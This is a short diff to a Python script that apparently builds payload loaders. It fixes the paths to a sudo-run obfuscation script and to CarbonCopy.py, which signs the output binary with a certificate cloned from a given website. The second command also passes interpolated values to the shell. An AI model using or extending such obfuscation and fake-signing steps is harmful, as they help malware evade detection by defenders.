@@ -499,7 +499,7 @@ def run_obfuscation(loader_path):
 
     try:
         # subprocess.run(['sudo', 'bash', 'obfuscate_file.sh', loader_path], check=True)
-        subprocess.run(['sudo', 'bash', 'obfuscate/obfuscate_file.sh', loader_path], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(['sudo', 'bash', './obfuscate/obfuscate_file.sh', loader_path], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         # Check if the patch file exists and rename it to obf_file
         if os.path.exists(patch_file):
             os.rename(patch_file, obf_file)
@@ -1005,7 +1005,7 @@ def main():
                 exit()  # Exit for any other input
 
         # If the file does not exist or the user has chosen to overwrite it, proceed with signing
-        carbon_copy_command = f"python3 CarbonCopy.py {website} 443 {output_file_path} {signed_output_file_path}"
+        carbon_copy_command = f"python3 signature/CarbonCopy.py {website} 443 {output_file_path} {signed_output_file_path}"
         subprocess.run(carbon_copy_command, shell=True, check=True)
         print(f"Signed binary generated: {signed_output_file_path}")
 
